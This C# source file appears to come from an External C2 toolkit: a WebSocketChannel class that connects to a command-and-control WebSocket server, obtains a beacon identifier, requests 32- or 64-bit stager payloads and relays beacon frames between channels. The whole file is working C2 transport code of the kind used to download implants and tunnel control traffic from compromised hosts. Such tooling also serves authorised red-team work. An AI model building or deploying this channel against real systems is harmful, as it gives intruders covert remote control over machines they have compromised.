using System;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ExternalC2.Frames;
using ExternalC2.Interfaces;

namespace ExternalC2.Channels
{
    /// <summary>
    ///     C2 Channel used to communication with the ExternalC2Web web socket server
    /// </summary>
    public class WebSocketChannel : IC2Channel
    {
        private const int MaxBufferSize = 1024 * 4;
        private readonly Uri _baseUri;
        private readonly ClientWebSocket _client;

        /// <summary>
        ///     Constructs a WebSocketChannel with a web socket URI: ws://127.0.0.1/bws
        /// </summary>
        /// <param name="uri"></param>
        public WebSocketChannel(string uri)
        {
            _client = new ClientWebSocket();
            _client.Options.KeepAliveInterval = TimeSpan.FromSeconds(30);
            _baseUri = new Uri(uri);
        }

        /// <summary>
        ///     The unique beacon identifier
        /// </summary>
        public Guid BeaconId { get; private set; }

        /// <summary>
        ///     Determines if the channel is connected
        /// </summary>
        public bool Connected => _client.State == WebSocketState.Open;

        /// <summary>
        ///     Connects to the WebSocket server
        /// </summary>
        /// <returns>If connection was successful</returns>
        public bool Connect()
        {
            return ConnectAsync().Result;
        }

        /// <summary>
        ///     Close the ClientWebSocket connection
        /// </summary>
        public void Close()
        {
            _client.CloseAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
        }

        /// <summary>
        ///     Dispose the ClientWebSocket
        /// </summary>
        public void Dispose()
        {
            _client.Dispose();
        }

        /// <summary>
        ///     Read a frame from the WebSocket server
        /// </summary>
        /// <returns>The frame buffer</returns>
        public byte[] ReadFrame()
        {
            return ReadMessageAsync().Result.Buffer;
        }

        /// <summary>
        ///     Send the buffer in a WebSocketFrame to the WebSocket server
        /// </summary>
        /// <param name="buffer"></param>
        public void SendFrame(byte[] buffer)
        {
            var frame = new WebSocketFrame(FrameType.ToServer, BeaconId, buffer);
            var frameBuffer = Encoding.UTF8.GetBytes(frame.Encode());

            SendMessageAsync(frameBuffer);
        }

        /// <summary>
        ///     Read a frame from the WebSocket server and send to the connected channel
        /// </summary>
        /// <param name="c2"></param>
        /// <returns></returns>
        public bool ReadAndSendTo(IC2Channel c2)
        {
            var buffer = ReadFrame();
            if (buffer.Length <= 0) return false;
            c2.SendFrame(buffer);

            return true;
        }

        /// <summary>
        ///     Requests a stager using the BeaconId of the channel
        /// </summary>
        /// <param name="is64Bit"></param>
        /// <param name="taskWaitTime"></param>
        /// <returns>The stager bytes</returns>
        public byte[] GetStager(bool is64Bit, int taskWaitTime = 100)
        {
            return GetStager(BeaconId.ToString(), is64Bit, taskWaitTime);
        }

        /// <summary>
        ///     Requests a stager using the pipeName parameter
        /// </summary>
        /// <param name="pipeName"></param>
        /// <param name="is64Bit"></param>
        /// <param name="taskWaitTime"></param>
        /// <returns>The stager bytes</returns>
        public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
        {
            var buffer = is64Bit ? new byte[] { 0x64 } : new byte[] { 0x86 };

            var frame = new WebSocketFrame(FrameType.Stager, BeaconId, buffer);
            var stagerFrame = SendAndWait(frame).Result;

            return stagerFrame.Buffer;
        }

        private async Task<bool> ConnectAsync()
        {
            await _client.ConnectAsync(_baseUri, CancellationToken.None);
            if (_client.State != WebSocketState.Open) return false;

            var frame = new WebSocketFrame(FrameType.Connect, Guid.Empty, new byte[] {0x00});
            var connectFrame = SendAndWait(frame).Result;

            BeaconId = connectFrame.BeaconId;

            return true;
        }

        private async void SendMessageAsync(byte[] buffer)
        {
            if (_client.State != WebSocketState.Open)
                throw new Exception("Web Socket not connected..."); // Might need reconnect logic here

            var bufferCount = (int) Math.Ceiling((double) buffer.Length / MaxBufferSize);
            for (var i = 0; i < bufferCount; i++)
            {
                var offset = MaxBufferSize * i;
                var count = MaxBufferSize;
                var lastMessage = i + 1 == bufferCount;

                if (count * (i + 1) > buffer.Length)
                    count = buffer.Length - offset;

                var message = new ArraySegment<byte>(buffer, offset, count);
                await _client.SendAsync(message, WebSocketMessageType.Text, lastMessage, CancellationToken.None);
            }
        }

        private async Task<WebSocketFrame> SendAndWait(WebSocketFrame frame)
        {
            if (_client.State != WebSocketState.Open)
                throw new Exception("Web Socket not connected..."); // Might need reconnect logic here

            await _client.SendAsync(frame.SegmentBytes(), WebSocketMessageType.Text, true, CancellationToken.None);

            WebSocketFrame stagerFrame;
            do
            {
                var readFrame = await ReadMessageAsync();
                stagerFrame = readFrame.Type == frame.Type ? readFrame : null;
                Thread.Sleep(500);
            } while (stagerFrame == null);

            return stagerFrame;
        }

        private async Task<WebSocketFrame> ReadMessageAsync()
        {
            if (_client.State != WebSocketState.Open)
                throw new Exception("Web Socket not connected..."); // Might need reconnect logic here

            var buffer = new byte[MaxBufferSize];
            var b64Str = new StringBuilder();

            WebSocketReceiveResult result;
            do
            {
                result = await _client.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

                if (result.MessageType == WebSocketMessageType.Close)
                    await _client.CloseAsync(WebSocketCloseStatus.NormalClosure, string.Empty,
                        CancellationToken.None);
                else
                    b64Str.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
            } while (!result.EndOfMessage);

            return WebSocketFrame.Decode(b64Str.ToString());
        }
    }
}